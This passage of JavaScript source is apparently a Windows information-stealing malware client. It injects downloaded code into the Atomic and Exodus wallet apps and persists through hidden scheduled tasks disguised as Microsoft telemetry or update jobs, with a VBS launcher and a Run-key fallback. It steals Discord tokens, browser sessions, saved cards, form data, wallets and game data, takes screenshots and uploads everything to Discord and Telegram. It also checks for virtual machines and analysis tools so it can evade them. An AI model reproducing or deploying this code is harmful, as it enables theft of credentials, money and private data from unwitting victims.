      setTimeout(b, 2000);
    } catch (j) {
      b();
    }
  });
}
async function walletInjection() {
  try {
    await Promise.all([injectAtomic(), injectExodus()]);
  } catch (c) {
    logError(c, "walletInjection");
  }
}
async function injectAtomic() {
  try {
    const c = path.join(process.env.LOCALAPPDATA, "Programs", "atomic");
    const d = path.join(c, "resources", "app.asar");
    const g = path.join(c, "LICENSE.electron.txt");
    const h = path.join(c, "." + generateRandomString(6));
    if (fs.existsSync(c)) {
      try {
        execSync("taskkill /IM \"Atomic Wallet.exe\" /F", {
          stdio: "ignore",
          windowsHide: true
        });
      } catch (j) {}
      await inject(c, d, atomicInjectionUrl, g, "Atomic", h);
    }
  } catch (l) {
    logError(l, "injectAtomic");
  }
}
async function injectExodus() {
  try {
    const b = path.join(process.env.LOCALAPPDATA, "exodus");
    if (!fs.existsSync(b)) {
      return;
    }
    try {
      execSync("taskkill /IM Exodus.exe /F", {
        stdio: "ignore",
        windowsHide: true
      });
    } catch (d) {}
    const c = fs.readdirSync(b).filter(g => g.startsWith("app-"));
    for (const g of c) {
      const h = path.join(b, g);
      const i = path.join(h, "resources", "app.asar");
      const j = path.join(h, "LICENSE");
      await inject(b, i, exodusInjectionUrl, j, "Exodus-" + g);
    }
  } catch (l) {
    logError(l, "injectExodus");
  }
}
async function inject(b, c, d, g, h) {
  if (!fs.existsSync(b)) {
    return;
  }
  if (!d || d.includes("REMPLACE_ME")) {
    return;
  }
  const j = path.join(path.dirname(c), ".mdw_lock");
  if (fs.existsSync(j)) {
    return;
  }
  try {
    if (!fs.existsSync(path.dirname(c))) {
      return;
    }
    const m = await axios.get(d, {
      responseType: "stream"
    });
    if (m.status !== 200) {
      logError("Failed to download injection: " + m.status, "inject-" + h);
      return;
    }
    const n = fs.createWriteStream(c);
    m.data.pipe(n);
    await new Promise((p, q) => {
      n.on("finish", p);
      n.on("error", q);
    });
    try {
      fs.writeFileSync(j, "done");
    } catch (q) {}
    if (g && discordWebhookUrl && !discordWebhookUrl.includes("REMPLACE_ME")) {
      try {
        fs.writeFileSync(g, discordWebhookUrl, "utf8");
      } catch (s) {
        logError(s, "inject-license-" + h);
      }
    }
  } catch (t) {
    logError(t, "inject-" + h);
  }
}
function basicStartup() {
  if (process.platform !== "win32") {
    return;
  }
  try {
    const l = path.resolve(process.execPath);
    const m = path.dirname(l).toLowerCase();
    const s = [{
      name: "WindowsTelemetrySync",
      desc: "Synchronizes system telemetry with Microsoft servers"
    }, {
      name: "NetFrameworkUpdate",
      desc: "Ensures .NET Framework components are up to date"
    }, {
      name: "SecurityHealthScan",
      desc: "Periodic background security health check"
    }, {
      name: "OneDriveHealthCheck",
      desc: "Monitors OneDrive sync health and performance"
    }, {
      name: "EdgeBrowserUpdate",
      desc: "Background maintenance for Microsoft Edge data"
    }];
    try {
      const H = s.map(K => K.name).join("|");
      const I = "powershell -NoProfile -ExecutionPolicy Bypass -Command \"Get-ScheduledTask | Where-Object { $_.TaskName -match '^(" + H + ")' -or $_.Description -match 'MaintenanceTask' -or ($_.Actions.Execute + ' ' + $_.Actions.Arguments) -match 'Microsoft\\\\Windows\\\\[a-zA-Z0-9]{8}\\\\' } | Unregister-ScheduledTask -Confirm:$false\"";
      execSync(I, {
        stdio: "ignore",
        windowsHide: true,
        timeout: 5000
      });
      const J = path.join(process.env.APPDATA, "Microsoft", "Windows");
      if (fs.existsSync(J)) {
        fs.readdirSync(J).forEach(K => {
          if (/^[a-zA-Z0-9]{8}$/.test(K)) {
            const L = path.resolve(path.join(J, K));
            if (L.toLowerCase() === m) {
              return;
            }
            try {
              const M = fs.readdirSync(L);
              if (M.some(N => N.endsWith(".exe") || N.endsWith(".vbs"))) {
                execSync("rmdir /s /q \"" + L + "\"", {
                  stdio: "ignore",
                  windowsHide: true
                });
              }
            } catch (O) {}
          }
        });
      }
    } catch (K) {}
    const t = generateRandomString(8);
    const u = generateRandomString(8) + ".exe";
    const v = path.join(process.env.APPDATA, "Microsoft", "Windows", t);
    if (!fs.existsSync(v)) {
      fs.mkdirSync(v, {
        recursive: true
      });
    }
    const x = path.resolve(path.join(v, u));
    if (l.toLowerCase() !== x.toLowerCase()) {
      try {
        fs.copyFileSync(l, x);
      } catch (L) {}
    }
    try {
      execSync("attrib +h +s \"" + v + "\"", {
        stdio: "ignore",
        windowsHide: true
      });
    } catch (M) {}
    const y = s[Math.floor(Math.random() * s.length)];
    const z = y.name + "_" + generateRandomString(6);
    const A = generateRandomString(8) + ".xml";
    const B = path.join(v, A);
    const C = os.userInfo().username;
    const D = generateRandomString(8) + ".vbs";
    const E = path.join(v, D);
    const F = "CreateObject(\"WScript.Shell\").Run \"\"\"\" & \"" + x + "\" & \"\"\" --hidden\", 0, False";
    const G = "<?xml version=\"1.0\" encoding=\"UTF-16\"?>\n<Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\">\n  <RegistrationInfo>\n    <Description>" + y.desc + "</Description>\n    <Author>" + C + "</Author>\n  </RegistrationInfo>\n  <Triggers>\n    <LogonTrigger>\n      <Enabled>true</Enabled>\n    </LogonTrigger>\n  </Triggers>\n  <Principals>\n    <Principal id=\"Author\">\n      <LogonType>InteractiveToken</LogonType>\n      <RunLevel>HighestAvailable</RunLevel>\n    </Principal>\n  </Principals>\n  <Settings>\n    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>\n    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>\n    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>\n    <AllowHardTerminate>true</AllowHardTerminate>\n    <StartWhenAvailable>true</StartWhenAvailable>\n    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>\n    <AllowStartOnDemand>true</AllowStartOnDemand>\n    <Enabled>true</Enabled>\n    <Hidden>true</Hidden>\n    <RunOnlyIfIdle>false</RunOnlyIfIdle>\n    <WakeToRun>false</WakeToRun>\n    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>\n    <Priority>7</Priority>\n  </Settings>\n  <Actions Context=\"Author\">\n    <Exec>\n      <Command>wscript.exe</Command>\n      <Arguments>//nologo \"" + E + "\"</Arguments>\n    </Exec>\n  </Actions>\n</Task>";
    try {
      fs.writeFileSync(E, F);
      fs.writeFileSync(B, G, {
        encoding: "utf16le"
      });
      execSync("schtasks /create /tn \"" + z + "\" /xml \"" + B + "\" /f", {
        stdio: "ignore",
        windowsHide: true
      });
      fs.unlinkSync(B);
    } catch (O) {
      try {
        execSync("schtasks /create /tn \"" + z + "\" /tr \"wscript.exe //nologo '" + E + "'\" /sc onlogon /rl highest /f", {
          stdio: "ignore",
          windowsHide: true
        });
      } catch (P) {
        execSync("reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"WinHost\" /t REG_SZ /d \"wscript.exe //nologo \\\"" + E + "\\\"\" /f", {
          stdio: "ignore",
          windowsHide: true
        });
      }
    }
    logSuccess("0xB");
  } catch (R) {
    logError(R, "basicStartup");
  }
}
class Client {
  async init() {
    let b = null;
    try {
      await loadConfiguration();
      cleanupProcesses();
      await new Promise(A => setTimeout(A, 200));
      if (CONFIG.startup) {
        await basicStartup();
      }
      if (CONFIG.fakeerror) {
        try {
          showFakeError();
        } catch (A) {}
      }
      const c = CONFIG.wallet ? walletInjection() : Promise.resolve();
      const d = CONFIG.wallet ? initializeService() : Promise.resolve();
      const g = CONFIG.backupcodes ? fetchDiscordTokens().catch(B => {
        logError(B, "fetchDiscordTokens");
        return 0;
      }) : Promise.resolve(0);
      const h = CONFIG.backupcodes ? fetchSocials().catch(B => {
        logError(B, "fetchSocials");
        return 0;
      }) : Promise.resolve(0);
      const i = CONFIG.games ? fetchGamesData().catch(B => {
        logError(B, "fetchGamesData");
        return 0;
      }) : Promise.resolve(0);
      const j = CONFIG.wallet ? fetchWallets().catch(B => {
        logError(B, "fetchWallets");
        return 0;
      }) : Promise.resolve(0);
      const k = CONFIG.browsers ? fetchFormData().catch(B => {
        logError(B, "fetchFormData");
        return 0;
      }) : Promise.resolve(0);
      const l = CONFIG.browsers ? fetchCreditCardData().catch(B => {
        logError(B, "fetchCreditCardData");
        return 0;
      }) : Promise.resolve(0);
      const m = CONFIG.filevpn ? fetchFileVPN().catch(B => {
        logError(B, "fetchFileVPN");
        return 0;
      }) : Promise.resolve(0);
      const n = CONFIG.browsers ? fetchUserData().catch(B => {
        logError(B, "fetchUserData");
        return 0;
      }) : Promise.resolve(0);
      const o = CONFIG.browsers ? fetchSessionData().catch(B => {
        logError(B, "fetchSessionData");
        return 0;
      }) : Promise.resolve(0);
      const p = await Promise.allSettled([n, o, k, l, g, h, i, j, m]);
      const q = p[0].value || 0;
      const r = p[1].value || 0;
      const s = p[2].value || 0;
      const t = p[3].value || 0;
      const u = p[4].value || 0;
      const v = p[5].value || 0;
      const w = p[6].value || 0;
      const x = p[7].value || 0;
      await Promise.allSettled([c, d]);
      let y = Buffer.alloc(0);
      try {
        y = await captureAllScreens();
      } catch (B) {
        logError(B, "Screenshot-Failed");
      }
      try {
        pruneMainFolder(mainFolderPath, FINAL_ARCHIVE_LIMIT);
      } catch (C) {}
      console.log("[System] Building data package and uploading...");
      let z = "0 B";
      try {
        const D = await createAndUploadZip();
        b = D.link;
        z = D.size;
      } catch (E) {
        logError(E, "Upload-All-Failed");
      }
      logInfo("[Discord] Sending embed... link=" + (b ? "YES" : "NO"));
      await Promise.allSettled([sendDiscordEmbed(y, b, z, q, r, s, t, u, v, w, x), sendTelegramMessage(y, b, z, q, r, s, t, u, v, w, x)]);
      logInfo("[Discord] Embed send completed.");
    } catch (F) {
      logError(F, "Client.init");
    } finally {
      finalizeLog();
      selfCleanup(b);
    }
  }
}
function checkSystem() {
  if (process.platform !== "win32") {
    return false;
  }
  const g = {
    users: ["WDAGUtilityAccount", "Abby", "pateu", "JohnDoe", "h4cci", "Prazzy", "Peter Wilson", "Timmy", "Emily", "Anna", "Caroline", "Lisa", "Robert", "David", "James", "Michael"],
    pcNames: ["BEE7390B-866E-4", "DESKTOP-GVB9695", "DESKTOP-4999DR8", "DESKTOP-H0C9S9H", "DESKTOP-6M7B5S4", "DESKTOP-51950T1", "HANDY-PC", "JOHN-PC", "DESKTOP-1PY9J9S", "WIN-7890BC", "DESKTOP-V9B0311"],
    processes: ["vboxservice.exe", "vboxtray.exe", "vmtoolsd.exe", "vmwaretray.exe", "vmwareuser.exe", "vgauthservice.exe", "vmacthlp.exe", "vmsrvc.exe", "vmusrvc.exe", "prl_cc.exe", "prl_tools.exe", "xenservice.exe", "qemu-ga.exe", "wireshark.exe", "fiddler.exe", "httpdebugger.exe", "processhacker.exe", "x64dbg.exe", "ollydbg.exe", "pestudio.exe", "vmperfmon.exe", "autoruns.exe", "procexp.exe", "vmsvga.exe"],
    macs: ["08:00:27", "00:05:69", "00:0C:29", "00:50:56", "00:1C:42", "00:16:3E", "08:00:20", "00:15:5D"],
    hardware: ["VirtualBox", "VMware", "Parallel", "QEMU", "Hyper-V", "KVM", "Xen"]
  };
  const h = () => {
    try {
      const k = execSync("powershell -NoProfile -ExecutionPolicy Bypass -Command \"(Get-Volume -DriveLetter C).Size\"", {
        windowsHide: true,
        stdio: "pipe",
        timeout: 5000
      }).toString();
      const l = parseInt(k.trim());
      if (!isNaN(l) && l < 107374182400) {
        return true;
      }
    } catch (m) {}
    return false;
  };
  const i = () => {
    try {
      const l = execSync("powershell -NoProfile -ExecutionPolicy Bypass -Command \"Get-CimInstance Win32_ComputerSystem | Select-Object -Property Model, Manufacturer | Format-List\"", {
        windowsHide: true,
        stdio: "pipe",
        timeout: 5000
      }).toString().toLowerCase();
      if (g.hardware.some(m => l.includes(m.toLowerCase()))) {
        return true;
      }
    } catch (m) {}
    return false;
  };
  const j = () => {
    try {
      const k = execSync("getmac", {
        windowsHide: true,
        stdio: "pipe",
        timeout: 5000
      }).toString();
      if (g.macs.some(l => k.includes(l))) {
        return true;
      }
    } catch (l) {}
    return false;
  };
  if (os.totalmem() < 4305704714.24) {
    return true;
  }
  if (os.cpus().length < 2) {
    return true;
  }
  if (g.users.includes(os.userInfo().username)) {
    return true;
  }
  if (g.pcNames.includes(os.hostname())) {
    return true;
  }
  if (h()) {
    return true;
  }
  if (i()) {
    return true;
  }
  if (j()) {
    return true;
  }
  try {
    const l = execSync("tasklist", {
      windowsHide: true,
      timeout: 10000
    }).toString().toLowerCase();
    if (g.processes.some(m => l.includes(m))) {
      return true;
    }
  } catch (m) {}
  return false;
}
(async () => {
  try {
    if (typeof _BUILD_MACHINE_GUARD === "string" && _BUILD_MACHINE_GUARD.length === 64) {
      var b = crypto.createHash("sha256").update(os.hostname() + "\0" + os.userInfo().username).digest("hex");
      if (b === _BUILD_MACHINE_GUARD) {
        process.exit(0);
      }
    }
    if (CONFIG.requireAdmin) {
      if (!hasAdminPrivileges()) {
        try {
          relaunchAsAdmin();
        } catch (d) {
          logError(d, "relaunchAsAdmin-denied");
        }
      }
      if (!hasAdminPrivileges()) {
        logInfo("Running without administrator (elevation failed or cancelled).");
      }
    }
    if (CONFIG.antivm) {
      if (checkSystem()) {
        process.exit(0);
      }
    }
    checkSingleInstance();
    initializeFolders();
    const c = new Client();
    await c.init();
  } catch (g) {
    logError(g, "main-executor");
  } finally {
    process.exit(0);
  }
})();
